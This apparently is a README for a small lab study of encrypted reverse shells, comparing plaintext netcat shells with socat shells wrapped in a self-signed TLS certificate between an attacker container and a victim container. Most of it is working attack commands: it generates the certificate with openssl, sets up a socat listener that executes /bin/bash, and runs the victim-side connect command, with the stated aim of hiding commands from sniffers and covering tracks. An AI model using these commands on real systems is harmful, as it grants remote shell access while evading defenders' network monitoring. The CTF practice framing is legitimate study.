# reverse-shell-tls
simple study of reverse shell using tls certificate to protect against sniffers

## Common reverse shell

As you may noticed during the usual ctf challenges (hack the box or vulnhub for example) you can simply run a reverse shell using netcat. Sadly as you ran a reverse shell with netcat, your traffic is not encrypted so if a sniffer is running on the workstation you are trying to hack, it can track all your commands.

In this experiment it has been used two containers:
* 172.18.0.2 - kali attacker
* 172.18.0.3 - victim pc

As a proof of what it has being said above, as you open the capture file shells.cap you may notice using the follow TCP stream option that all the commands are in clear-text, and so far it isn't good as for hiding tracks.


## Encrypted reverse shell

If you want to try to create a reverse shell with the tls option, you need **socat**. But before running socat, you need to create a certificate with OpenSSL. To create a certificate run the following:

`openssl req -newkey rsa:2048 -noenc -keyout privatekey.key -x509 -days 1000 -out cert.crt`

if you don't mind the informations about your certificate just press the enter key until is done. This command has the following options:
* req = request
* -newkey = generates a new key usually it is rsa with a complexity of 2048 bits
* -noenc = does not encrypt the private key
* -keyout = outputs the key content to a file
* -x509 = generates a x509 certificate
* -days = validity of the certificate
* -out = outputs all the informations (the extensions must end as crt)

once done this command, it needs both the private key that the certificate to be together so that the ssl exchange can be done:

`cat privatekey.key cert.crt > certificate.pem`

now you need to tell socat to use this certificate:

`socat -d openssl-listen:5555,cert=certificate.pem,verify=0 EXEC:/bin/bash`

this tells socat to listen in ssl to the port 5555 plus:
* cert = the certificate to pass to socat
* verify = it has the value 0 so that doesn't block with let's encrypt
* EXEC = executes a command (in this case spawn a bash shell)

on the victim pc run the following command:

`socat -d openssl:172.18.0.2:5555,verify=0`

as your run this command you will obtain a dumb shell, but the commands are now encrypted (check the secret.cap)

